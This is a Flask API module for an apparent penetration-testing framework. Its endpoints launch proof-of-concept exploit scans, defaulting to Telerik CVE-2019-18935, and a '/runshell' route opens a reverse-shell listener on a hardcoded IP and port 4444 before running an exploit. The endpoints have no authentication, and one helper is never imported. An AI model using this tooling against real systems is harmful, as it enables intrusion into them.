
from datetime import datetime
import string
from flask import Blueprint, Response, request
from pymongo import results
from Database.database import get_exploit_cve, get_pocs_with_id
from api.v1.output import make_output
from Library.Exploit.POCURI import POCURI
Poc = Blueprint('Poc', __name__)
import xml.etree.ElementTree as ET
from threading import Thread
from Library.Target.target import get_target_url
from Library.Exploit.runpoc import run_scan
from Tools.ToolExploit.openport import openport
@Poc.route('/tools', methods=['GET'])
def get_all_tools():
    CPOC = POCURI()
    result = CPOC.get_all_pocs()
    print(result)
    if not isinstance(result, str):
        return Response(make_output(data = result, message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= result ), mimetype="application/json", status=404)


@Poc.route('/get', methods=['GET'])
def get_answer_poc():
    data_filter = {}
    if ("target_id" in request.args):
        data_filter['target_id'] = request.args['target_id']
    [status, data] = get_exploit_cve(data_filter)
    result = []
    for i in range(data.count()):
        temp = data[i];
        temp['_id'] = str(temp['_id'])
        result.append(temp)
    if status:
        return Response(make_output(data = result, message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= result ), mimetype="application/json", status=404)

@Poc.route('/getall', methods=['GET'])
def get_all_answer_poc():
    [status, data] = get_exploit_cve({})
    result = []
    for i in range(data.count()):
        temp = data[i];
        temp['_id'] = str(temp['_id'])
        result.append(temp)
    if status:
        return Response(make_output(data = result, message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= result ), mimetype="application/json", status=404)



def checkpoc_run(recon_id, pocs):
    
    check_pocs = run_scan(recon_id=recon_id, pocenable = pocs)
    check_pocs.run()

global checkpoc_running 
checkpoc_running = []

@Poc.route('/start', methods=['PUT'])
def request_put_runpoc():
    recon_id = request.form['recon_id']
    if 'pocrun' in request.form:
        run_pocs = request.form['pocrun']
    else: 
        run_pocs = '*telerik_cve_2019_18935*'
    global checkpoc_running
    [status, dataend] = get_target_id_with_recon_id(recon_id)
    if status :
        runthread = Thread(target=checkpoc_run, args=(recon_id, run_pocs, ))
        runthread.start()
        checkpoc_running.append({"thread": runthread, "recon_id": recon_id, "date": datetime.now().strftime("%d/%m/%Y %H:%M:%S") })
        return Response(make_output(data = "start check poc susscess", message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= str(status) ), mimetype="application/json", status=404)

@Poc.route('/status', methods=['GET'])
def request_status_runpoc():
    global checkpoc_running
    result = []
    temp_recon = []
    for run in checkpoc_running:
        if run['thread'].isAlive():
            result.append({'recon_id': run['recon_id'], 'date' : run['date']})
            temp_recon.append(run)
    checkpoc_running = temp_recon
    if len(result) :
        return Response(make_output(data = result, message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= "No data" ), mimetype="application/json", status=404)


def pocrun_shell(data, datashellrequest):
    if "LPORT" in datashellrequest:
        LPORT = datashellrequest['LPORT']
    else: LPORT = 4444
    if "LHOST" in datashellrequest:
        LHOST = datashellrequest['LHOST']
    else: LHOST = "13.76.188.147"
    openp = openport(LHOST, LPORT)
    #status = openp.check_connect(60)
    threop = Thread(target=openp.check_connect, args=(60,))
    threop.start()
    recon_id = data['recon_id']
    check_pocs = run_scan(recon_id=recon_id)
    check_pocs.run_poc(data, datashellrequest)

global poc_running 
poc_running = []

@Poc.route('/runshell', methods=['PUT'])
def request_runshell():
    try:
        requentdata = request.json
        checkpoc_id =requentdata['checkpoc_id']
        if 'data' in requentdata:
            runshell_data = requentdata['data']
        else: 
            runshell_data = {}
    except Exception as e:
        print(e)
        return Response(make_output(message =  "fail", data= str(e) ), mimetype="application/json", status=404)

    global poc_running
    [status, data] = get_pocs_with_id(checkpoc_id)
    if status :
        runthread = Thread(target=pocrun_shell, args=(data, runshell_data ))
        runthread.start()
        poc_running.append({"thread": runthread, "pocs_id": checkpoc_id, "date": datetime.now().strftime("%d/%m/%Y %H:%M:%S") })
        return Response(make_output(data = "start poc susscess", message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= str(status) ), mimetype="application/json", status=404)

@Poc.route('/status_shell', methods=['GET'])
def request_status_runpocshell():
    global poc_running
    result = []
    temp_recon = []
    for run in poc_running:
        if run['thread'].isAlive():
            result.append({'pocs_id': run['pocs_id'], 'date' : run['date']})
            temp_recon.append(run)
    poc_running = temp_recon
    if len(result) :
        return Response(make_output(data = result, message ='success'), mimetype="application/json", status=200)
    else:
        return Response(make_output(message =  "fail", data= "No data" ), mimetype="application/json", status=404)

